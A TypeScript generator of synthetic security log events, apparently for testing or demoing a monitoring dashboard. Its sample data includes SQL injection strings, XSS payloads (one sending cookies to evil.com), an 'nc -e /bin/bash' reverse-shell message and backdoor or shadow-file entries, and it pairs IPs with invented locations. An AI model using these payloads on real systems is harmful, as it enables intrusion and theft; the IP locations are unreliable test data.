import { v4 as uuidv4 } from 'uuid';
import { LogEvent, Severity, EventCategory, GeoInfo } from './types';

const INTERNAL_IPS = [
  '10.0.1.50', '10.0.1.51', '10.0.1.52', '10.0.2.10',
  '10.0.2.11', '192.168.1.100', '192.168.1.101', '172.16.0.5',
];

const EXTERNAL_IPS: { ip: string; geo: GeoInfo }[] = [
  { ip: '185.220.101.45', geo: { country: 'Russia', country_code: 'RU', city: 'Moscow', lat: 55.75, lon: 37.62 } },
  { ip: '103.214.147.20', geo: { country: 'China', country_code: 'CN', city: 'Beijing', lat: 39.90, lon: 116.40 } },
  { ip: '45.153.160.2', geo: { country: 'Netherlands', country_code: 'NL', city: 'Amsterdam', lat: 52.37, lon: 4.90 } },
  { ip: '198.235.24.130', geo: { country: 'United States', country_code: 'US', city: 'Chicago', lat: 41.85, lon: -87.65 } },
  { ip: '91.108.4.200', geo: { country: 'Iran', country_code: 'IR', city: 'Tehran', lat: 35.69, lon: 51.42 } },
  { ip: '194.165.16.78', geo: { country: 'Ukraine', country_code: 'UA', city: 'Kyiv', lat: 50.45, lon: 30.52 } },
  { ip: '221.181.185.198', geo: { country: 'China', country_code: 'CN', city: 'Shanghai', lat: 31.22, lon: 121.47 } },
  { ip: '77.83.246.53', geo: { country: 'Germany', country_code: 'DE', city: 'Frankfurt', lat: 50.11, lon: 8.68 } },
  { ip: '62.233.50.11', geo: { country: 'Romania', country_code: 'RO', city: 'Bucharest', lat: 44.43, lon: 26.10 } },
  { ip: '92.118.160.14', geo: { country: 'Brazil', country_code: 'BR', city: 'São Paulo', lat: -23.54, lon: -46.63 } },
  { ip: '136.243.154.200', geo: { country: 'North Korea', country_code: 'KP', city: 'Pyongyang', lat: 39.02, lon: 125.75 } },
  { ip: '109.70.100.25', geo: { country: 'Turkey', country_code: 'TR', city: 'Istanbul', lat: 41.01, lon: 28.96 } },
];

const USERS = ['admin', 'root', 'john.doe', 'jane.smith', 'svc_account', 'backup_user', 'devops', 'guest', 'anonymous'];
const HOSTNAMES = ['web-srv-01', 'db-srv-02', 'auth-srv-01', 'mail-srv-01', 'api-srv-03', 'fileserver-02', 'dc-01', 'proxy-01'];
const SERVICES: Record<number, string> = {
  21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
  80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS', 445: 'SMB',
  1433: 'MSSQL', 3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL',
  6379: 'Redis', 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt', 27017: 'MongoDB',
};

const SQL_PAYLOADS = [
  "' OR 1=1--", "'; DROP TABLE users;--", "UNION SELECT * FROM passwords",
  "1' AND SLEEP(5)--", "admin'--", "' OR 'a'='a",
];

const XSS_PAYLOADS = [
  "<script>alert('xss')</script>", "javascript:alert(1)",
  "<img src=x onerror=alert(1)>", "<svg onload=fetch('//evil.com?c='+document.cookie)>",
];

function pick<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randInt(min: number, max: number): number {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomPort(): number {
  const ports = Object.keys(SERVICES).map(Number);
  return Math.random() < 0.7 ? pick(ports) : randInt(1024, 65535);
}

export function generateEvent(forcedSrcIp?: string): LogEvent {
  const category = pick<EventCategory>(['authentication', 'network', 'web', 'system', 'firewall',
    'authentication', 'network', 'web', 'firewall']); // weighted
  const externalEntry = pick(EXTERNAL_IPS);
  const srcIp = forcedSrcIp ?? (Math.random() < 0.6 ? externalEntry.ip : pick(INTERNAL_IPS));
  const srcGeo = EXTERNAL_IPS.find(e => e.ip === srcIp)?.geo;
  const dstIp = pick(INTERNAL_IPS);
  const dstPort = randomPort();
  const hostname = pick(HOSTNAMES);
  const user = Math.random() < 0.6 ? pick(USERS) : undefined;
  const now = new Date().toISOString();

  let severity: Severity = 'info';
  let message = '';
  let tags: string[] = [];
  let action = 'allow';
  let statusCode: number | undefined;
  let url: string | undefined;
  let bytes: { sent?: number; received?: number } = {};

  switch (category) {
    case 'authentication': {
      const success = Math.random() > 0.35;
      const proto = pick(['SSH', 'RDP', 'LDAP', 'Kerberos', 'Web']);
      if (success) {
        severity = Math.random() < 0.1 ? 'medium' : 'info';
        message = `Successful ${proto} login for user '${user}' from ${srcIp}`;
        action = 'success';
        tags = ['auth', 'login-success'];
      } else {
        severity = Math.random() < 0.3 ? 'high' : 'medium';
        message = `Failed ${proto} authentication for user '${user}' from ${srcIp} - Invalid credentials`;
        action = 'failure';
        tags = ['auth', 'login-failure', 'brute-force-indicator'];
      }
      break;
    }
    case 'network': {
      const proto = pick(['TCP', 'UDP', 'ICMP']);
      const flags = pick(['SYN', 'SYN-ACK', 'RST', 'FIN', 'PSH-ACK']);
      severity = Math.random() < 0.2 ? 'medium' : Math.random() < 0.1 ? 'high' : 'info';
      message = `${proto} connection from ${srcIp}:${randInt(1024, 65535)} to ${dstIp}:${dstPort} [${flags}]`;
      action = flags === 'RST' ? 'block' : 'allow';
      tags = ['network', 'connection', proto.toLowerCase()];
      bytes = { sent: randInt(64, 65535), received: randInt(64, 65535) };
      if (dstPort in SERVICES) tags.push(SERVICES[dstPort].toLowerCase());
      break;
    }
    case 'web': {
      const method = pick(['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS']);
      const paths = ['/api/users', '/admin/login', '/wp-admin', '/api/data', '/.env',
        '/etc/passwd', '/api/v1/exec', '/phpmyadmin', '/api/auth/token'];
      const chosenPath = pick(paths);
      statusCode = pick([200, 200, 200, 301, 400, 401, 403, 404, 500, 200]);
      const hasSql = Math.random() < 0.15;
      const hasXss = Math.random() < 0.1;
      const payload = hasSql ? `?id=${pick(SQL_PAYLOADS)}` : hasXss ? `?q=${pick(XSS_PAYLOADS)}` : '';
      url = chosenPath + payload;
      if (hasSql) { severity = 'critical'; tags = ['web', 'sqli', 'injection']; }
      else if (hasXss) { severity = 'high'; tags = ['web', 'xss', 'injection']; }
      else if (chosenPath.includes('.env') || chosenPath.includes('passwd')) {
        severity = 'high'; tags = ['web', 'recon', 'sensitive-file'];
      } else {
        severity = statusCode >= 500 ? 'medium' : statusCode === 401 || statusCode === 403 ? 'low' : 'info';
        tags = ['web', 'http'];
      }
      message = `${method} ${url} HTTP/1.1 ${statusCode} from ${srcIp}`;
      action = statusCode >= 400 ? 'block' : 'allow';
      bytes = { sent: randInt(100, 8192), received: randInt(200, 102400) };
      break;
    }
    case 'system': {
      const events = [
        { msg: `Process 'nc -e /bin/bash' executed by ${user}`, sev: 'critical' as Severity, tags: ['system', 'reverse-shell', 'process'] },
        { msg: `sudo privilege escalation by ${user} to root`, sev: 'high' as Severity, tags: ['system', 'privilege-escalation', 'sudo'] },
        { msg: `Cron job modified: /etc/cron.d/backdoor added by ${user}`, sev: 'critical' as Severity, tags: ['system', 'persistence', 'cron'] },
        { msg: `File /etc/shadow accessed by ${user}`, sev: 'high' as Severity, tags: ['system', 'credential-access'] },
        { msg: `SSH key added to /root/.ssh/authorized_keys`, sev: 'high' as Severity, tags: ['system', 'persistence', 'ssh'] },
        { msg: `Service 'systemd' restarted on ${hostname}`, sev: 'info' as Severity, tags: ['system', 'service'] },
        { msg: `Package installed: nmap 7.94 by ${user}`, sev: 'medium' as Severity, tags: ['system', 'recon-tool'] },
        { msg: `Firewall rules modified by ${user}`, sev: 'medium' as Severity, tags: ['system', 'firewall-change'] },
      ];
      const ev = pick(events);
      message = ev.msg;
      severity = ev.sev;
      tags = ev.tags;
      action = 'execute';
      break;
    }
    case 'firewall': {
      const blocked = Math.random() > 0.3;
      const proto = pick(['TCP', 'UDP']);
      severity = blocked
        ? (dstPort === 22 || dstPort === 3389 || dstPort === 1433 ? 'high' : 'medium')
        : 'info';
      message = blocked
        ? `Firewall BLOCKED ${proto} ${srcIp}:${randInt(1024, 65535)} -> ${dstIp}:${dstPort} [${SERVICES[dstPort] ?? 'UNKNOWN'}]`
        : `Firewall ALLOWED ${proto} ${srcIp}:${randInt(1024, 65535)} -> ${dstIp}:${dstPort}`;
      action = blocked ? 'block' : 'allow';
      tags = ['firewall', blocked ? 'blocked' : 'allowed', proto.toLowerCase()];
      bytes = { sent: randInt(64, 1500) };
      break;
    }
  }

  const raw = `${now} ${hostname} ${category.toUpperCase()} ${severity.toUpperCase()} ${message}`;

  return {
    id: uuidv4(),
    timestamp: now,
    severity,
    category,
    source_ip: srcIp,
    destination_ip: dstIp,
    source_port: randInt(1024, 65535),
    destination_port: dstPort,
    protocol: category === 'web' ? 'HTTP/HTTPS' : pick(['TCP', 'UDP']),
    user,
    hostname,
    message,
    raw,
    tags,
    geo: srcGeo,
    bytes_sent: bytes.sent,
    bytes_received: bytes.received,
    status_code: statusCode,
    url,
    action,
  };
}

export function generateBurst(count: number, srcIp?: string): LogEvent[] {
  return Array.from({ length: count }, () => generateEvent(srcIp));
}
